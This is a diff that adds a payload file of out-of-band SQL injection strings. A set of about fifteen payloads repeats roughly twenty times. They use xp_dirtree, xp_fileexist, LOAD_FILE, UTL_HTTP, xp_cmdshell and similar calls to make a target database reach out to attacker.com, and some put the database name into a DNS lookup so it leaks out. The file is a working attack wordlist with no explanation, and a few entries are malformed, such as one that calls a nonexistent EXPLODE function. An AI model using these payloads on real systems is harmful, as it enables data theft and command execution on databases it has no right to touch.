@@ -1,0 +1,300 @@
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
+'; exec master..xp_dirtree '\\attacker.com\share'--
+' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--
+' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--
+' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--
+'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--
+' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--
+' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--
+' AND UTL_HTTP.REQUEST('http://attacker.com/log')--
+' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--
+'; EXEC('xp_cmdshell ''ping attacker.com''')--
+'; exec master..xp_fileexist '\\attacker.com\test'--
+' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--
+' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--
